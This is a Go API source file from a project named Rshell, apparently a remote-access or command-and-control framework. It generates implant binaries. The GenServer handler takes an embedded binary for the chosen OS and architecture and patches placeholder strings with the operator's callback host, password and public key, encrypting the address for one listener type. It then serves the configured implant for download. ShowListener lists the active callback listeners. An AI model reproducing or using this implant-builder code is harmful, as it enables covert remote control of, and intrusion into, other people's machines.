package api

import (
	"Rshell/pkg/database"
	"Rshell/pkg/encrypt"
	"Rshell/pkg/response"
	"Rshell/pkg/service"
	"bytes"
	"github.com/gin-gonic/gin"
	"strconv"
	"strings"
)

// GenServer generate a server binary
// @Summary Generate server binary
// @Tags Generators
// @Accept json
// @Produce octet-stream
// @Param body body object true "{osType: OS type, archType: architecture, listener: listener URL, pass: password}"
// @Success 200 {file} binary "server binary"
// @Failure 400 {object} object "bad request"
// @Router /api/v1/generators/servers [post]
// @Security BearerAuth
func GenServer(c *gin.Context) {
	var serverBody struct {
		OsType   string `json:"osType" binding:"required"`
		ArchType string `json:"archType" binding:"required"`
		Listener string `json:"listener" binding:"required"`
		Pass     string `json:"pass" binding:"required"`
	}
	if err := c.ShouldBindJSON(&serverBody); err != nil {
		response.BadRequest(c, err.Error())
		return
	}
	osType := serverBody.OsType
	archType := serverBody.ArchType

	listenerTmp := strings.Split(serverBody.Listener, "://")
	listenerType := listenerTmp[0]
	connectAddress := listenerTmp[1]

	binaryFileName := service.FindBinary(listenerType, osType, archType)
	if binaryFileName == "" {
		response.BadRequest(c, "Binary file not found")
		return
	}
	binaryData, err := service.EmbeddedFiles.ReadFile("server/" + listenerType + "/" + binaryFileName)
	if err != nil {
		response.BadRequest(c, "Failed to read file")
		return
	}

	var modifiedData []byte
	if listenerType == "oss" {
		oldStr := ""
		newStr := strings.ReplaceAll(connectAddress, " ", "")
		tmp, _ := encrypt.EncryptNormal([]byte(newStr))
		tmp2, _ := encrypt.EncodeBase64(tmp)
		newStr = string(tmp2)
		newStr = service.PadRight(newStr, len(oldStr))
		modifiedData = bytes.ReplaceAll(binaryData, []byte(oldStr), []byte(newStr))
	} else {
		oldStr := "HOSTAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"
		newStr := strings.ReplaceAll(connectAddress, " ", "")
		newStr = service.PadRight(newStr, len(oldStr))
		modifiedData = bytes.ReplaceAll(binaryData, []byte(oldStr), []byte(newStr))
	}
	oldPass := "PASSAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"
	newPass := service.PadRight(serverBody.Pass, len(oldPass))
	modifiedData = bytes.ReplaceAll(modifiedData, []byte(oldPass), []byte(newPass))

	oldPublicKey := "ServerPublicKeyAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"
	var key database.Key
	database.Engine.Where("1=1").Get(&key)
	newPublicKey := service.PadRight(key.PublicKey, len(oldPublicKey))
	modifiedData = bytes.ReplaceAll(modifiedData, []byte(oldPublicKey), []byte(newPublicKey))

	c.Header("Content-Description", "File Transfer")
	c.Header("Content-Transfer-Encoding", "binary")
	c.Header("Content-Disposition", "attachment; filename="+binaryFileName)
	c.Header("Content-Type", "application/octet-stream")
	c.Header("Content-Length", strconv.Itoa(len(modifiedData)))
	c.Writer.Write(modifiedData)
}

// ShowListener list active listeners
// @Summary List active listeners
// @Tags Generators
// @Accept json
// @Produce json
// @Success 200 {object} object "success"
// @Failure 400 {object} object "bad request"
// @Router /api/v1/generators/listeners/active [get]
// @Security BearerAuth
func ShowListener(c *gin.Context) {
	var listeners []database.Listener
	database.Engine.Where("status = ?", 1).Find(&listeners)

	var result []string
	for _, listener := range listeners {
		result = append(result, listener.Type+"://"+listener.ConnectAddress)
	}
	response.OK(c, result)
}
